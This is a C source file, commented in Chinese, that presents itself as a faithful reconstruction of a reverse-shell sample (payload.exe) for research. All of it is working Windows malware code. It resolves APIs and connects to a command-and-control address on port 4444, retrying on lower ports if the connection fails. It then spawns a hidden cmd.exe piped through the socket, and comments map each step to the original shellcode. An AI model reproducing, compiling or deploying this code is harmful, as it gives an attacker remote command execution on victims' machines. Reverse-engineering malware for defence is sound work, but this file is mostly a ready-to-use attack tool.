/*
 * payload_reconstructed.c
 * ========================
 * 开源逆向还原：基于 payload.exe (2025-08-29) 的反向 Shell
 *
 * 原始文件:
 *   SHA256: 4e6e8393a421e0a42d75411ecc77c58d4720620f6f19508c12633b091e997907
 *   入口点: .zsrp 节中的位置无关 shellcode
 *
 * 本文件是原始二进制 payload 的忠实语义重构，
 * 使用标准 Win32 API 调用，仅用于教育和研究目的。
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "kernel32.lib")

/* ==============================================================
 * 配置 — 匹配原始 payload
 * ============================================================== */
#define C2_IP       "192.168.30.15"
#define C2_PORT     4444
#define RETRY_PORT  TRUE       /* 原始行为：连接失败时递减端口重试 */

/* ==============================================================
 * 存储已解析函数指针的结构体
 * 原始 shellcode 通过 PEB 遍历 + 哈希查找动态解析所有 API，
 * 这里使用等效的 GetProcAddress 调用
 * ============================================================== */
typedef struct _API_TABLE {
    /* Kernel32 */
    HMODULE hKernel32;
    FARPROC fnLoadLibraryA;
    FARPROC fnVirtualProtect;
    FARPROC fnVirtualAlloc;
    FARPROC fnCreateProcessA;
    FARPROC fnExitProcess;

    /* WS2_32 (动态加载) */
    HMODULE hWs2_32;
    FARPROC fnWSAStartup;
    FARPROC fnWSASocketA;
    FARPROC fnConnect;
    FARPROC fnWSAEventSelect;
} API_TABLE;

/* ==============================================================
 * ResolveApi — 模拟原始 shellcode 的哈希查找 API 解析
 * 原始代码：遍历 PEB->LDR->InMemoryOrderModuleList，
 * 对每个名称计算 ROR-13 哈希，匹配后从导出目录取地址。
 * 这里用 GetProcAddress 作为等效的高层实现。
 * ============================================================== */
static BOOL ResolveApi(API_TABLE *api)
{
    api->hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!api->hKernel32) return FALSE;

    api->fnLoadLibraryA    = GetProcAddress(api->hKernel32, "LoadLibraryA");
    api->fnVirtualProtect  = GetProcAddress(api->hKernel32, "VirtualProtect");
    api->fnVirtualAlloc    = GetProcAddress(api->hKernel32, "VirtualAlloc");
    api->fnCreateProcessA  = GetProcAddress(api->hKernel32, "CreateProcessA");
    api->fnExitProcess     = GetProcAddress(api->hKernel32, "ExitProcess");

    if (!api->fnLoadLibraryA || !api->fnCreateProcessA) return FALSE;

    /* 加载 ws2_32.dll — 对应原始代码中的 LoadLibraryA("ws2_32") */
    api->hWs2_32 = ((HMODULE(*)(LPCSTR))api->fnLoadLibraryA)("ws2_32.dll");
    if (!api->hWs2_32) return FALSE;

    api->fnWSAStartup    = GetProcAddress(api->hWs2_32, "WSAStartup");
    api->fnWSASocketA    = GetProcAddress(api->hWs2_32, "WSASocketA");
    api->fnConnect       = GetProcAddress(api->hWs2_32, "connect");
    api->fnWSAEventSelect = GetProcAddress(api->hWs2_32, "WSAEventSelect");

    return (api->fnWSAStartup && api->fnWSASocketA && api->fnConnect);
}

/* ==============================================================
 * CreateReverseShell — 核心逻辑
 * 对应原始 shellcode 从偏移 0x95 开始的流程
 * ============================================================== */
static int CreateReverseShell(API_TABLE *api)
{
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    int port = C2_PORT;

    /* 初始化 Winsock — 对应原始代码：WSAStartup */
    if (((int(WSAAPI*)(WORD, LPWSADATA))api->fnWSAStartup)(MAKEWORD(2, 2), &wsa) != 0)
        return -1;

connect_retry:
    /*
     * 创建 TCP Socket — 对应原始代码：
     * WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
     */
    sock = ((SOCKET(WSAAPI*)(int, int, int, LPVOID, DWORD, DWORD))api->fnWSASocketA)(
        AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
        return -1;

    /* 构造 sockaddr_in — 对应原始 shellcode 中的 push 指令 */
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons((WORD)port);
    addr.sin_addr.s_addr = inet_addr(C2_IP);

    /* 连接 C2 — 对应原始代码：connect(socket, sockaddr, 16) */
    if (((int(WSAAPI*)(SOCKET, const struct sockaddr*, int))api->fnConnect)(
            sock, (struct sockaddr*)&addr, sizeof(addr)) != 0)
    {
        closesocket(sock);

        /*
         * 原始代码中的重试逻辑：
         *   dec dword ptr [esi+8]  ; 递减端口
         *   jnz retry              ; 重试
         */
        if (RETRY_PORT && port > 0)
        {
            port--;
            goto connect_retry;
        }
        return -1;
    }

    /*
     * 连接成功 —— 以下对应原始 shellcode 偏移 0xF1 之后的代码：
     * 创建 cmd.exe 进程，将 stdin/stdout/stderr 重定向到 socket
     */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));

    /*
     * 创建进程 — 对应原始代码：
     * CreateProcessA(NULL, "cmd", NULL, NULL, TRUE,
     *                CREATE_NO_WINDOW, NULL, NULL, &si, &pi)
     */
    ((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        api->fnCreateProcessA)(
            NULL,
            "cmd",
            NULL, NULL,
            TRUE,           /* bInheritHandles = TRUE，socket 句柄可继承 */
            CREATE_NO_WINDOW,
            NULL, NULL,
            &si, &pi);

    /*
     * 等待 shell 退出 — 原始代码在 CreateProcessA 之后
     * 会调用 WaitForSingleObject，等待 shell 结束
     */
    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);

    return 0;
}

/* ==============================================================
 * 入口 — 对应原始 PE 的 .text 存根 + .zsrp 入口点
 *
 * 原始存根代码：
 *   push ebp
 *   mov  ebp, esp
 *   lea  eax, [ebp-4]
 *   push eax
 *   push 0x40             ; PAGE_EXECUTE_READWRITE
 *   push 0x1000           ; MEM_COMMIT
 *   push 0x00403000       ; .zsrp 地址
 *   call [0x00402000]     ; VirtualProtect
 *   mov  ecx, 0x00403000  ; .zsrp 基址
 *   call ecx             ; 跳转到 shellcode
 *   xor  eax, eax
 *   mov  esp, ebp
 *   pop  ebp
 *   ret
 * ============================================================== */
int main(void)
{
    API_TABLE api;

    if (!ResolveApi(&api))
    {
        ((void(WINAPI*)(UINT))api.fnExitProcess)(1);
    }

    CreateReverseShell(&api);

    ((void(WINAPI*)(UINT))api.fnExitProcess)(0);
    return 0;
}
